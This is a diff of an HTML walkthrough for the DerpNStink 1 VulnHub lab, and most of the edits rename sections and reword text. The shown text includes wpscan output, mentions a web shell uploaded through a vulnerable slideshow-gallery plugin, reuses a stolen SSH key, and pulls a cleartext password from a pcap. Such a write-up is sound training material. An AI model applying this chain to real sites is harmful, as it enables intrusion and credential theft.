@@ -18,15 +18,15 @@ layout: default
         <li><a href="#summary">Summary</a></li>
         <li><a href="#portscan">Port Scanning</a></li>
         <li><a href="#infogather">Information Gathering</a></li>
-        <li><a href="#foothold">Foothold</a></li>
-        <li><a href="#stinky">Privesc - stinky</a></li>
-        <li><a href="#mrderp">Privesc - mrderp</a></li>
-        <li><a href="#root">Privesc - root</a></li>
+        <li><a href="www-data">Shell - www-data</a></li>
+        <li><a href="#stinky">Shell - stinky</a></li>
+        <li><a href="#mrderp">Shell - mrderp</a></li>
+        <li><a href="#root">Shell - root</a></li>
     </ul>
 
     <h2><a id="summary">Summary</a></h2>
 
-    <p>The path to initial exploitation begins with enumerating directories against the web server.  A wordpress website is found and scanned with wpscan.  There is a vulnerable plugin installed that allows a php web shell to be uploaded and accessed.  Initially a www-data shell is gained.  Going from www-data to the user stinky involves grabbing stinky's credentials from mysql and cracking a hash.  Privesc to mrderp required looking through a pcap file for a cleartext password.  Root is gained through a sudo ability of mrderp.</p>
+    <p>The path to exploitation begins with enumerating directories against the web server.  A wordpress website is found and scanned with wpscan.  There is a vulnerable plugin installed that allows a php web shell to be uploaded and accessed.  Initially a www-data shell is gained.  Going from www-data to the user stinky involves grabbing stinky's credentials from mysql and cracking a hash.  Privesc to mrderp required looking through a pcap file for a cleartext password.  Root is gained through a sudo ability of mrderp.</p>
 
     <h2><a id="portscan">Port Scanning</a></h2>
 
@@ -70,13 +70,16 @@ layout: default
     
     <img src="../images/derpnstink1/derpnstink_local_src.png">
 
-    <li>The source code show wordpress directories (wp-content, etc.)  So I run wpscan against the site.</li>
+    <br>
+    <br>
+
+    <li>The source code reveals that this is a wordpress site due to the wp directories (wp-content, etc.).  So I run wpscan against the site.</li>
 
     <pre>
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1]&#13;&#10;&boxur;&HorizontalLine;$ wpscan --url http://derpnstink.local/weblog                                                                                                        130 &Cross;&#13;&#10;_______________________________________________________________&#13;&#10;         __          _______   _____&#13;&#10;         \ \        / /  __ \ / ____|&#13;&#10;          \ \  /\  / /| |__) | (___   ___  __ _ _ __ &reg;&#13;&#10;           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &apos;_ \&#13;&#10;            \  /\  /  | |     ____) | (__| (_| | | | |&#13;&#10;             \/  \/   |_|    |_____/ \___|\__,_|_| |_|&#13;&#10;&#13;&#10;         WordPress Security Scanner by the WPScan Team&#13;&#10;                         Version 3.8.18&#13;&#10;       Sponsored by Automattic - https://automattic.com/&#13;&#10;       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart&#13;&#10;_______________________________________________________________&#13;&#10;&#13;&#10;[+] URL: http://derpnstink.local/weblog/ [10.0.0.21]&#13;&#10;[+] Started: Mon Sep 27 10:34:06 2021&#13;&#10;&#13;&#10;Interesting Finding(s):&#13;&#10;&#13;&#10;[+] Headers&#13;&#10; | Interesting Entries:&#13;&#10; |  - Server: Apache/2.4.7 (Ubuntu)&#13;&#10; |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22&#13;&#10; | Found By: Headers (Passive Detection)&#13;&#10; | Confidence: 100%&#13;&#10;&#13;&#10;[+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php&#13;&#10; | Found By: Headers (Passive Detection)&#13;&#10; | Confidence: 100%&#13;&#10; | Confirmed By:&#13;&#10; |  - Link Tag (Passive Detection), 30% confidence&#13;&#10; |  - Direct Access (Aggressive Detection), 100% confidence&#13;&#10; | References:&#13;&#10; |  - http://codex.wordpress.org/XML-RPC_Pingback_API&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/&#13;&#10;&#13;&#10;[+] WordPress readme found: http://derpnstink.local/weblog/readme.html&#13;&#10; | Found By: Direct Access (Aggressive Detection)&#13;&#10; | Confidence: 100%&#13;&#10;&#13;&#10;[+] The external WP-Cron seems to be enabled: http://derpnstink.local/weblog/wp-cron.php&#13;&#10; | Found By: Direct Access (Aggressive Detection)&#13;&#10; | Confidence: 60%&#13;&#10; | References:&#13;&#10; |  - https://www.iplocation.net/defend-wordpress-from-ddos&#13;&#10; |  - https://github.com/wpscanteam/wpscan/issues/1299&#13;&#10;&#13;&#10;[+] WordPress version 4.6.9 identified (Insecure, released on 2017-11-29).&#13;&#10; | Found By: Emoji Settings (Passive Detection)&#13;&#10; |  - http://derpnstink.local/weblog/, Match: &apos;wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.9&apos;&#13;&#10; | Confirmed By: Meta Generator (Passive Detection)&#13;&#10; |  - http://derpnstink.local/weblog/, Match: &apos;WordPress 4.6.9&apos;&#13;&#10;&#13;&#10;[+] WordPress theme in use: twentysixteen&#13;&#10; | Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/&#13;&#10; | Last Updated: 2021-07-22T00:00:00.000Z&#13;&#10; | Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt&#13;&#10; | [!] The version is out of date, the latest version is 2.5&#13;&#10; | Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9&#13;&#10; | Style Name: Twenty Sixteen&#13;&#10; | Style URI: https://wordpress.org/themes/twentysixteen/&#13;&#10; | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout &mdash; the horizontal masthead ...&#13;&#10; | Author: the WordPress team&#13;&#10; | Author URI: https://wordpress.org/&#13;&#10; |&#13;&#10; | Found By: Css Style In Homepage (Passive Detection)&#13;&#10; |&#13;&#10; | Version: 1.3 (80% confidence)&#13;&#10; | Found By: Style (Passive Detection)&#13;&#10; |  - http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9, Match: &apos;Version: 1.3&apos;&#13;&#10;&#13;&#10;[+] Enumerating All Plugins (via Passive Methods)&#13;&#10;[+] Checking Plugin Versions (via Passive and Aggressive Methods)&#13;&#10;&#13;&#10;[i] Plugin(s) Identified:&#13;&#10;&#13;&#10;[+] slideshow-gallery&#13;&#10; | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/&#13;&#10; | Last Updated: 2021-08-19T23:03:00.000Z&#13;&#10; | [!] The version is out of date, the latest version is 1.7.3&#13;&#10; |&#13;&#10; | Found By: Urls In Homepage (Passive Detection)&#13;&#10; |&#13;&#10; | Version: 1.4.6 (100% confidence)&#13;&#10; | Found By: Readme - Stable Tag (Aggressive Detection)&#13;&#10; |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt&#13;&#10; | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)&#13;&#10; |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt&#13;&#10;&#13;&#10;[+] Enumerating Config Backups (via Passive and Aggressive Methods)&#13;&#10; Checking Config Backups - Time: 00:00:00 &lt;==============================================================================&gt; (137 / 137) 100.00% Time: 00:00:00&#13;&#10;&#13;&#10;[i] No Config Backups Found.&#13;&#10;&#13;&#10;[!] No WPScan API Token given, as a result vulnerability data has not been output.&#13;&#10;[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register&#13;&#10;&#13;&#10;[+] Finished: Mon Sep 27 10:34:10 2021&#13;&#10;[+] Requests Done: 173&#13;&#10;[+] Cached Requests: 5&#13;&#10;[+] Data Sent: 46.338 KB&#13;&#10;[+] Data Received: 237.561 KB&#13;&#10;[+] Memory used: 212.973 MB&#13;&#10;[+] Elapsed time: 00:00:03
     </pre>
 
-    <h2><a id="foothold">Foothold</a></h2>
+    <h2><a id="www-data shell">www-data shell</a></h2>
 
     <li>wpscan reveals that this wordpress site is using the plugin slide-show gallery.  It is also version 1.4.6 which is out of date compared to the latest version of 1.7.3.  So I search for exploits using searchsploit</li>
 
@@ -161,7 +164,7 @@ Backdoor location: http://VICTIM/wordpress/wp-content/uploads/slideshow-gallery/
     <br>
     <br>
     
-    <h2><a id="stinky">Privesc - stinky</a></h2>
+    <h2><a id="stinky">Shell - stinky</a></h2>
 
     <li>Once on the box I check the active local ports.</li>
 
@@ -268,7 +271,7 @@ stinky@DeRPnStiNK:~/.ssh$ cat id_rsa&#13;&#10;-----BEGIN RSA PRIVATE KEY-----&#1
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ ssh stinky@10.0.0.21 -i stinky_rsa &#13;&#10;The authenticity of host &apos;10.0.0.21 (10.0.0.21)&apos; can&apos;t be established.&#13;&#10;ECDSA key fingerprint is SHA256:qT1plVN18XwMzkU3qgKKZJAoPJC3+eZDxlrczLy3iCY.&#13;&#10;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes&#13;&#10;Warning: Permanently added &apos;10.0.0.21&apos; (ECDSA) to the list of known hosts.&#13;&#10;Ubuntu 14.04.5 LTS&#13;&#10;&#13;&#10;&#13;&#10;                       ,~~~~~~~~~~~~~..&#13;&#10;                       &apos;  Derrrrrp  N  `&#13;&#10;        ,~~~~~~,       |    Stink      | &#13;&#10;       / ,      \      &apos;,  ________ _,&quot;&#13;&#10;      /,~|_______\.      \/&#13;&#10;     /~ (__________)   &#13;&#10;    (*)  ; (^)(^)&apos;:&#13;&#10;        =;  ____  ;&#13;&#10;          ; &quot;&quot;&quot;&quot;  ;=&#13;&#10;   {&quot;}_   &apos; &apos;&quot;&quot;&apos; &apos; _{&quot;}&#13;&#10;   \__/     &gt;  &lt;   \__/&#13;&#10;      \    ,&quot;   &quot;,  /&#13;&#10;       \  &quot;       /&quot;&#13;&#10;          &quot;      &quot;=&#13;&#10;           &gt;     &lt;&#13;&#10;          =&quot;     &quot;-&#13;&#10;          -`.   ,&apos;&#13;&#10;                -&#13;&#10;            `--&apos;&#13;&#10;&#13;&#10;Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)&#13;&#10;&#13;&#10; * Documentation:  https://help.ubuntu.com/&#13;&#10;&#13;&#10;331 packages can be updated.&#13;&#10;231 updates are security updates.&#13;&#10;&#13;&#10;Last login: Mon Nov 13 00:31:29 2017 from 192.168.1.129&#13;&#10;stinky@DeRPnStiNK:~$ 
     </pre>
 
-    <li><a id="mrderp">Privesc - mrderp</a></li>
+    <h2><a id="mrderp">Shell - mrderp</a></h2>
 
     <li>Inside of the folder "Documents" in stinky's home directory, we find a pcap file called derpissues.pcap.</li>
 
@@ -282,23 +285,23 @@ stinky@DeRPnStiNK:~/Documents$ ls -la&#13;&#10;total 4300&#13;&#10;drwxr-xr-x  2
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/DerpNStink_1/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ scp -i stinky_rsa stinky@10.0.0.21:~/Documents/derpissues.pcap .                                                                 130 &Cross;&#13;&#10;Ubuntu 14.04.5 LTS&#13;&#10;&#13;&#10;&#13;&#10;                       ,~~~~~~~~~~~~~..&#13;&#10;                       &apos;  Derrrrrp  N  `&#13;&#10;        ,~~~~~~,       |    Stink      | &#13;&#10;       / ,      \      &apos;,  ________ _,&quot;&#13;&#10;      /,~|_______\.      \/&#13;&#10;     /~ (__________)   &#13;&#10;    (*)  ; (^)(^)&apos;:&#13;&#10;        =;  ____  ;&#13;&#10;          ; &quot;&quot;&quot;&quot;  ;=&#13;&#10;   {&quot;}_   &apos; &apos;&quot;&quot;&apos; &apos; _{&quot;}&#13;&#10;   \__/     &gt;  &lt;   \__/&#13;&#10;      \    ,&quot;   &quot;,  /&#13;&#10;       \  &quot;       /&quot;&#13;&#10;          &quot;      &quot;=&#13;&#10;           &gt;     &lt;&#13;&#10;          =&quot;     &quot;-&#13;&#10;          -`.   ,&apos;&#13;&#10;                -&#13;&#10;            `--&apos;&#13;&#10;&#13;&#10;derpissues.pcap                                                                                          100% 4289KB  50.3MB/s   00:00    
     </pre>
 
-    <li>There is another useful file we can find within stinky's home directory before loading the pcap file into wireshark.  There is a file called derpissues.txt in ~/ftp/files/network-logs</li>
+    <li>There is another useful file we can find within stinky's home directory before loading the pcap file into wireshark.  This file called derpissues.txt in ~/ftp/files/network-logs.</li>
 
     <pre>
 stinky@DeRPnStiNK:~/ftp/files/network-logs$ ls -la&#13;&#10;total 12&#13;&#10;drwxr-xr-x 2 stinky stinky 4096 Nov 12  2017 .&#13;&#10;drwxr-xr-x 5 stinky stinky 4096 Nov 12  2017 ..&#13;&#10;-rwxr-xr-x 1 root   root    719 Nov 12  2017 derpissues.txt&#13;&#10;stinky@DeRPnStiNK:~/ftp/files/network-logs$ cat derpissues.txt &#13;&#10;12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?&#13;&#10;12:07 stinky: yeah. did you need a password reset?&#13;&#10;12:07 mrderp: I think i accidently deleted my account&#13;&#10;12:07 mrderp: i just need to logon once to make a change&#13;&#10;12:07 stinky: im gonna packet capture so we can figure out whats going on&#13;&#10;12:07 mrderp: that seems a bit overkill, but wtv&#13;&#10;12:08 stinky: commence the sniffer!!!!&#13;&#10;12:08 mrderp: -_-&#13;&#10;12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?&#13;&#10;12:11 mrderp: awesome it works!&#13;&#10;12:12 stinky: we really are the best sysadmins #team&#13;&#10;12:13 mrderp: i guess we are...&#13;&#10;12:15 mrderp: alright I made the changes, feel free to decomission my account&#13;&#10;12:20 stinky: done! yay
     </pre>
 
-    <li>By reading through this file we know that we should be looking for a password for mrderp in the pcap file.  Now we go back to our Kali machine and load the pcap file into wireshark.  Once it is loaded, we set the filter to "http" and then press ctrl + f to find a packet.  In the search bar for finding a packet we type "mrderp" and then click "find" until we come accross a packet that reveals mrderp's password</li>
+    <li>By reading through derpissues.txt we know that we should be looking for a password for mrderp in the pcap file.  Now we go back to our Kali machine and load the pcap file into wireshark.  Once it is loaded, we set the filter to "http" and then press ctrl + f to find a packet.  In the search bar for finding a packet we type "mrderp" and then click "find" until we come accross a packet that reveals mrderp's password.  The packet search criteria must also be set to "Packet details" in this case.</li>
 
     <img src="../images/derpnstink1/mrderp_password.png">
 
     <br>
     <br>
-    
+
     <li>Using the password derpderpderpderpderpderpderp we are able to use the "su" command to switch to the user mrderp.</li>
 
     <br>
-    <h2><a id="root">Privesc - Root</a></h2>
+    <h2><a id="root">Shell - Root</a></h2>
 
     <li>As mrderp I check sudo -l to check for any sudo permissions.</li>
 
